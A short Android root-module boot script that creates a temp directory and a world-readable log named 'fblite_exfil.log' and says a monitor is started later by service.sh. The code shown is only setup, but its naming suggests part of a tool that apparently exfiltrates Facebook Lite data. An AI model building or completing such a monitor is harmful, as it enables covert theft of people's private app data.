#!/system/bin/sh

# Execute early in boot, ensure directory exists
MODDIR=${0%/*}

# Ensure target data directory is accessible
# This runs before service.sh to prepare environment

wait_for_boot_complete() {
  while [ "$(getprop sys.boot_completed)" != "1" ]; do
    sleep 1
  done
}

# Ensure log directory exists
mkdir -p /data/local/tmp
touch /data/local/tmp/fblite_exfil.log
chmod 644 /data/local/tmp/fblite_exfil.log

# Start the monitor via service.sh (handled by LATESTARTSERVICE)
